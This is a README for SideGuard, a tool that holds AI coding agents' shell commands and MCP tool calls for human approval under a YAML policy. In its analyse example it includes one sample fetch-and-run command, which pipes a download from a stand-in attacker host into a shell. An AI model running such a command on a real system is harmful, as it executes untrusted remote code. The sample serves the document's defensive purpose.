<p align="center">
  <a href="https://sideguard.io/">
    <img
      src="assets/readme-hero.png"
      alt="SideGuard — Vibe Coding Security Tool. MCP guard with human-in-the-loop approval for Cursor and Claude Code."
      width="100%"
    />
  </a>
</p>

<p align="center">
  <a href="https://sideguard.io/">sideguard.io</a>
  · <a href="https://sideguard.io/#install">Install</a>
  · <a href="https://sideguard.io/llms-full.txt">AI context</a>
</p>

<p align="center">
  <sub>Fail-closed hooks · YAML policy · local audit trail · not an MCP antivirus</sub>
</p>

Before your AI assistant runs a shell command or MCP tool on your machine, SideGuard asks you to approve. It intercepts **shell/terminal commands** and **MCP tool calls**, applies your YAML policy, and holds risky actions for human approval via the terminal CLI (`sideguard ui`), an optional macOS menu-bar tray, and alert-only notifications.

## Status

**MVP complete (vgf Phases 1–8):** shell/MCP intercept → YAML policy (auto-allow/deny) → macOS notify → terminal approvals → `sideguard doctor` bypass detection → HTTP Stream MCP proxy library. **Tier 2 interactive UI** (`sideguard ui`) is built into the binary. **Recent:** global approval mode (`sideguard mode`), experimental macOS menu-bar tray (`sideguard tray`), surgical `sideguard uninstall`, client reload hints (`sideguard clients reload`), and repo-scoped dev workspace policy (`sideguard policy init-dev` / `install --dev`). **New:** local obfuscation-resistant shell auto-detect engine with smart-triage `auto` mode (`sideguard mode set auto`) and persisted command history (`sideguard history`). **GitHub Releases self-update** — tray background checks plus `sideguard update` CLI (see [Updating](#updating)). **LLM settings & on-demand analyse** — multi-provider config in tray Settings or `sideguard llm provider`, plus `sideguard analyse` and tray **Analyse** on history rows (see [LLM settings & analyse](#llm-settings--analyse)). HTTP URL install wrap remains future work per [roadmap](docs/roadmap.md).

## Quick start

```bash
make build
sideguard daemon start
sideguard install          # wire Cursor/Claude hooks + MCP wrap + daemon + macOS tray
sideguard status
sideguard clients reload   # how to reload hooks/MCP in Cursor & Claude Code
sideguard tray             # macOS menu bar — Allow/Deny from the icon (experimental)
```

After `install` or `uninstall`, reload AI clients so hook and MCP config changes take effect. SideGuard cannot force a reload:

| Client | Usually enough | If changes do not apply |
| --- | --- | --- |
| **Cursor** | Save `hooks.json` (auto-reload on save) | **Cmd+Shift+P** → **Developer: Reload Window** (no full quit) |
| **Claude Code** | Wait a few seconds (file watcher on `settings.json`) | `/exit` and start a new session; `/hooks` lists hooks but does not reload |

Run `sideguard clients reload` for the full per-client guide.

On macOS, `sideguard install` also registers the menu-bar tray LaunchAgent (`com.sideguard.tray.plist`) so approvals are available from the menu bar after login. Use `--headless` to skip tray install (SSH, CI, or servers without a GUI session). `--skip-daemon` only skips the daemon LaunchAgent; hooks/MCP are unchanged.

To remove integration: `sideguard uninstall` surgically strips SideGuard hooks and MCP wraps (your other config stays). It removes daemon and tray LaunchAgents on macOS unless you pass `--keep-daemon`. Use `--restore-backup` to revert files from the oldest pre-install backup instead. Then run `sideguard clients reload`.

### Menu bar tray (macOS, experimental)

Background menu-bar icon that polls the daemon on loopback (`127.0.0.1:9477`) every ~2s. The tray does **not** replace the terminal UI (`sideguard ui`) or CLI (`approve` / `deny`).

**Prerequisites**

1. Daemon running: `sideguard daemon start` (or `sideguard daemon install-service` for login auto-start)
2. Build with CGO: `CGO_ENABLED=1 make build`

**Run**

| Method | Command |
| --- | --- |
| Terminal | `./bin/sideguard tray` |
| `.app` bundle | `CGO_ENABLED=1 make tray-app` then `open "dist/SideGuard Tray.app"` |

The `.app` bundle sets `LSUIElement` so the tray appears in the menu bar only (no Dock icon). Unsigned builds may be blocked by Gatekeeper — right-click the app → **Open** the first time.

**Login auto-start**

- **Default:** `sideguard install` registers both the daemon and tray LaunchAgents on macOS.
- **Tray only:** `sideguard tray install-service` — writes `~/Library/LaunchAgents/com.sideguard.tray.plist` without re-running full install.
- **`.app` bundle:** System Settings → General → Login Items — add `SideGuard Tray.app`, or use `CGO_ENABLED=1 make tray-app`.

**Popover panel (macOS)**

Click the menu-bar icon to open a **popover panel** below the icon (not a context menu). Pending approvals appear at the top with flat **Allow** and **Deny** buttons; resolved history appears below with **Load more…** for older records. The footer shows daemon health and pending count; **Mode** (Ask / Auto / Auto-allow / Auto-deny) is in the header hamburger menu. Up to **10** pending rows are shown in-panel; use `sideguard ui` for overflow. **Quit** requires confirmation. The tray popover/menu shows pending approvals and recent history; use terminal `sideguard history` for full search/filter. When new pending approvals arrive, the panel **auto-opens** if hidden. Click the icon again to dismiss.

On non-macOS builds, the tray uses a classic systray context menu with the same pending/history layout (up to **15** visible history rows; **Load older history…** for older records).

When pending approvals exist, the icon switches to an orange-badge variant and the menu-bar title shows the count (updates on the ~2s poll, not push/instant).

If the daemon is not running at tray launch, status shows unreachable until you start the daemon.

When an agent is blocked, open the interactive approval UI:

```bash
sideguard ui
```

- **↑/↓** or **j/k** — select a pending request
- **a** — approve · **d** — deny · **r** — refresh · **g** — cycle approval mode · **q** — quit
- Auto-refreshes every ~2s while running

Global approval mode (`ask` / `auto` / `auto-allow` / `auto-deny`) is persisted by the daemon and shared with the menu-bar tray:

```bash
sideguard mode                    # show current mode
sideguard mode set auto           # smart triage: safe pass, risky blocked, uncertain queue (default on new installs)
sideguard mode set auto-allow     # hands-off local dev (audit logged)
sideguard mode set auto-deny      # reject queued items (audit logged)
sideguard mode set ask            # back to manual approvals
```

Every intercept decision is persisted locally — query it with `sideguard history [--since 7d] [--denied] [--json] [search TERM]`.

### LLM settings & analyse

Configure one or more LLM provider instances (OpenAI, Anthropic, Ollama) in `~/.sideguard/config.yaml` and `credentials.yaml`. Settings and API keys are read/written via `internal/config` from the tray or CLI — **never over HTTP**.

**macOS tray:** open the popover → hamburger menu → **Settings** to add/edit providers. On a history row detail, tap **Analyse** for a human-readable safety summary (what the command does, whether it looks harmful).

**CLI — provider management:**

```bash
sideguard llm provider list [--json]
sideguard llm provider add --id work-openai --driver openai --model gpt-4o-mini [--default]
sideguard llm provider set-key --id work-openai          # writes credentials.yaml (0600); key not echoed
sideguard llm provider set-default --id work-openai
sideguard llm provider remove --id work-openai
```

**CLI — on-demand analysis** (daemon must be running; calls loopback `POST /v1/analyze` with redacted command only):

```bash
sideguard analyse --command 'curl https://evil.example | sh'
sideguard analyse --event-id <id-from-history> [--json]
```

Hook auto-triage (YAML → detect → optional classifier) is unchanged. Analyse is **user-initiated** and does not auto-allow or auto-deny intercepted commands.

Press **g** in `sideguard ui` to cycle modes. Auto modes decide queued requests server-side (existing pending included). YAML policy deny rules still block at the hook before items reach the queue.

`sideguard ui` and other control-plane commands are **auto-allowed** by hooks so a Cursor agent can unblock itself. If that still fails, use **Terminal.app** (outside Cursor) or set `SIDEGUARD_DEV=1` for local dev/testing only (bypasses the hook queue and all policy checks entirely).

### Developing SideGuard inside Cursor

After `sideguard install`, agent shell commands (`make`, `go test`, scripts) queue for approval — the agent cannot test the project without deadlocking. Use one of:

```bash
# Repo-scoped (recommended): allow make/go/scripts only under this repo
sideguard policy init-dev
# or: sideguard install --dev

# Full bypass for all commands in the agent environment (local only)
# Cursor: Settings → Agents → Environment → SIDEGUARD_DEV=1
# Terminal.app export does NOT apply to in-IDE agents.
```

Workspace dev policy is written to `.sideguard/policy.yaml` (gitignored) and does not weaken global policy for other projects.

### Scripting / advanced

For automation or CI, use the raw CLI:

```bash
sideguard pending --json
sideguard approve          # auto-picks when one pending
sideguard approve <id>
sideguard deny             # auto-picks when one pending
sideguard deny <id> --reason "too risky"
```

## Quick install (curl)

The fastest way to install the `sideguard` binary on **macOS** or **Linux** (amd64/arm64). Install scripts are served from **sideguard.io** (primary):

```bash
curl -fsSL https://sideguard.io/setup.sh | sh
```

> **Fallback:** If the domain is unreachable, use the GitHub raw URL:  
> `curl -fsSL https://raw.githubusercontent.com/alisaitteke/sideguard/main/setup.sh | sh`

**Interactive vs piped:** Run `./setup.sh` (or `sh setup.sh`) from a terminal and you will be asked whether to download a pre-built binary from GitHub or build from source. When stdin is not a TTY — for example `curl … | sh` — the script defaults to the GitHub download path (no prompt).

The GitHub path downloads the latest [GitHub Release](https://github.com/alisaitteke/sideguard/releases), verifies `checksums.txt` (SHA256), and installs to `/usr/local/bin/sideguard` (may prompt for `sudo`). The source path requires `git`, Go, and a C compiler for CGO (`CGO_ENABLED=1`, same as `make build`); it builds in the current checkout when run inside this repo, otherwise clones to a temporary directory.

**Environment variables** (all optional):

| Variable | Default | Description |
| --- | --- | --- |
| `SIDEGUARD_INSTALL_MODE` | `github` when piped; prompt when interactive | `github` — download release binary; `source` — build from source |
| `SIDEGUARD_VERSION` | `latest` | Pin a release: `v0.1.2`, `0.1.2`, or `latest` (GitHub download only) |
| `SIDEGUARD_INSTALL_DIR` | `/usr/local/bin` | Directory for the `sideguard` binary |
| `SIDEGUARD_RUN_INSTALL` | `0` | Set to `1` to also run `sideguard install` (hooks/MCP/daemon wiring) |

```bash
# Default piped install (GitHub binary)
curl -fsSL https://sideguard.io/setup.sh | sh

# Non-interactive source build (e.g. CI or scripted dev setup)
SIDEGUARD_INSTALL_MODE=source curl -fsSL https://sideguard.io/setup.sh | sh

# Pin a version (GitHub download)
SIDEGUARD_VERSION=v0.1.2 curl -fsSL https://sideguard.io/setup.sh | sh

# Install to ~/.local/bin
SIDEGUARD_INSTALL_DIR="$HOME/.local/bin" curl -fsSL https://sideguard.io/setup.sh | sh

# Binary + full integration in one step
SIDEGUARD_RUN_INSTALL=1 curl -fsSL https://sideguard.io/setup.sh | sh

# Fallback (GitHub raw — when sideguard.io is unreachable)
curl -fsSL https://raw.githubusercontent.com/alisaitteke/sideguard/main/setup.sh | sh
```

**After install** (default flow — binary only, then wire clients yourself):

```bash
sideguard daemon start
sideguard install          # Cursor/Claude hooks + MCP wrap + daemon (+ macOS tray)
sideguard status
sideguard clients reload   # reload hooks/MCP in Cursor & Claude Code
```

**Limitations:** Windows is not supported by `setup.sh` — download the `.zip` from [GitHub Releases](#installing-from-github-releases) manually. On Linux, login auto-start and the menu-bar tray differ from macOS; use `sideguard daemon start` (or a user systemd unit) after `sideguard install`. Release binaries are unsigned — see [macOS Gatekeeper](#macos-gatekeeper-unsigned-releases).

For manual download, archive naming, and checksum verification by hand, see [Installing from GitHub Releases](#installing-from-github-releases) below.

## Site development

The [sideguard.io](https://sideguard.io) landing is a Vite + React app under `site/`. Edit and preview it on your macOS host (Node.js required; Go toolchain unchanged for binary dev). Node 22 is recommended.

```bash
cd site
npm install
npm run dev      # http://localhost:5173 — Vite HMR
npm run build    # outputs site/dist/
npm run preview  # local production preview
```

Production deploys `site/dist/` to GitHub Pages via [`.github/workflows/pages.yml`](.github/workflows/pages.yml). For DNS and operator steps, see [docs/runbooks/sideguard-io-github-pages.md](docs/runbooks/sideguard-io-github-pages.md).

Regenerate README / OG brand images: `cd site && npm run render:social-card` (writes `assets/readme-hero.png`, `site/public/assets/og-card.png`, `.github/social-preview.png`).

Launch / press assets (Product Hunt, social banners, logos): see [`media-kit/`](media-kit/) — regenerate with `cd site && npm run render:media-kit`.

Shortcut: `make site-dev` (same as `cd site && npm run dev`).

## Installing from GitHub Releases

Pre-built binaries are published on [GitHub Releases](https://github.com/alisaitteke/sideguard/releases) with a `checksums.txt` (SHA256) for each tag. Pick the archive for your platform:

| Platform | Archive name pattern |
| --- | --- |
| macOS Apple Silicon | `sideguard_<version>_darwin_arm64.tar.gz` |
| macOS Intel | `sideguard_<version>_darwin_amd64.tar.gz` |
| Linux amd64 | `sideguard_<version>_linux_amd64.tar.gz` |
| Linux arm64 | `sideguard_<version>_linux_arm64.tar.gz` |
| Windows amd64 | `sideguard_<version>_windows_amd64.zip` |

```bash
# Example (macOS arm64) — replace <version> with the release tag without "v"
VERSION=0.1.0
curl -fsSL -O "https://github.com/alisaitteke/sideguard/releases/download/v${VERSION}/checksums.txt"
curl -fsSL -O "https://github.com/alisaitteke/sideguard/releases/download/v${VERSION}/sideguard_${VERSION}_darwin_arm64.tar.gz"
shasum -a 256 -c checksums.txt   # Linux: sha256sum -c checksums.txt
tar -xzf "sideguard_${VERSION}_darwin_arm64.tar.gz"
sudo install -m 755 sideguard /usr/local/bin/sideguard   # or any directory on your PATH
sideguard --version
sideguard install
```

Release builds are **unsigned**. On macOS, Gatekeeper may quarantine the binary after download — see [macOS Gatekeeper](#macos-gatekeeper-unsigned-releases) below.

## Updating

SideGuard checks [GitHub Releases](https://github.com/alisaitteke/sideguard/releases) for newer versions, verifies SHA256 checksums before replacing the running binary, and keeps `~/.sideguard` state (hooks, policy, audit DB) unchanged.

### Tray (background check)

When the menu-bar tray is running (`sideguard install` on macOS, or `sideguard tray` / systray on Linux/Windows), a **separate** background loop (default every **6 hours**) compares your binary version against the latest release. When an update is available:

- **macOS popover** — footer shows **Install update vX.Y.Z**; click to apply.
- **Linux / Windows systray** — **Install update vX.Y.Z…** menu item appears above Quit.

Install is **one-click and user-initiated** — nothing auto-applies without your action. The tray spawns `sideguard update apply --restart --yes`, exits so the binary can be swapped, then the daemon and tray are restarted.

### CLI

```bash
sideguard update check              # compare running version vs latest release
sideguard update check --json       # machine-readable output
sideguard update status             # last check time, latest known, background check state
sideguard update apply              # download, verify checksum, replace current binary
sideguard update apply --restart    # also restart daemon + tray after swap
sideguard update apply --yes        # skip confirmation (scripts / tray)
sideguard update apply --version 1.2.3   # install a specific release
```

Update metadata is stored in `~/.sideguard/update-state.json`.

### Configuration

In `~/.sideguard/config.yaml`:

```yaml
update:
  enabled: true          # false disables background tray checks and is reflected in update status
  check_interval: 6h     # tray poll interval (Go duration string)
  channel: stable        # reserved for future use; no effect in v1
```

### Dev builds

Local `make build` binaries embed `Version=dev` (or a `snapshot` tag). Background update checks are **skipped** for dev/snapshot builds so local development is not interrupted. Use `make build` / `go build` for hacking; use [GitHub Releases](#installing-from-github-releases) or `sideguard update apply` for production installs.

### macOS Gatekeeper (unsigned releases)

Release binaries are not Apple-notarized. After download, macOS may block execution or show **“cannot be opened because the developer cannot be verified.”** Options:

1. **First launch** — right-click the binary (or `SideGuard Tray.app`) → **Open** → confirm once.
2. **Remove quarantine** (if downloaded via browser):

```bash
xattr -dr com.apple.quarantine /path/to/sideguard
```

Self-update (`sideguard update apply`) downloads over HTTPS and verifies SHA256 against the release `checksums.txt` before replacing the binary.

## Optional polish (gum / fzf)

You no longer need external tools for day-to-day approvals — use `sideguard ui`. If you prefer gum/fzf pipelines:

```bash
brew install gum
sideguard pending --json | jq -r '.[] | "\(.id)\t\(.command // .tool_name)"' | gum choose --header "Pending approvals"
```

macOS notifications are **alert-only** — decisions always happen in the terminal.

## Architecture

- **Single Go binary** — daemon, CLI, hook bridge, MCP wrap, interactive TUI, and menu-bar tray (CGO on macOS)
- **Terminal-first UX** — `sideguard ui` for keyboard-driven approvals; optional macOS menu-bar tray for Allow/Deny; notifications are alert-only
- **Hybrid interception** — MCP STDIO proxy + Cursor/Claude hook bridge
- **Fail-closed** — commands do not reach the OS until explicitly approved
- **LaunchAgent daemon** — user-session GUI context for `osascript` / `terminal-notifier`

## Documentation

| Document | Description |
| --- | --- |
| [docs/roadmap.md](docs/roadmap.md) | Product roadmap and API contracts |
| [ARCHITECTURE.md](ARCHITECTURE.md) | System overview, components, and security model |
| [docs/research-report.md](docs/research-report.md) | Cursor/Claude hooks and hybrid architecture research |
| [docs/integration-and-terminal-ui.md](docs/integration-and-terminal-ui.md) | Install flow and terminal approval UX |
| [docs/plans/2026-07-01-0127-sideguard-foundation/](docs/plans/2026-07-01-0127-sideguard-foundation/) | Phased implementation plan |
| [docs/plans/2026-07-03-0904-product-hunt-launch-readiness/](docs/plans/2026-07-03-0904-product-hunt-launch-readiness/) | Product Hunt launch readiness research & roadmap |

## Local paths

| Path | Purpose |
| --- | --- |
| `~/.sideguard/run/sideguard.sock` | Unix socket |
| `~/.sideguard/audit.db` | SQLite audit log |
| `~/.sideguard/update-state.json` | Last update check + latest known release |
| `http://127.0.0.1:9477/v1/health` | Daemon HTTP health |

## Author

Built by **[Ali Sait Teke](https://alisait.com)** — software architect (Go, Python, Node, React).
[GitHub](https://github.com/alisaitteke) · [LinkedIn](https://www.linkedin.com/in/alisait/) · [Architecture](ARCHITECTURE.md)

## License

MIT — see [LICENSE](LICENSE).
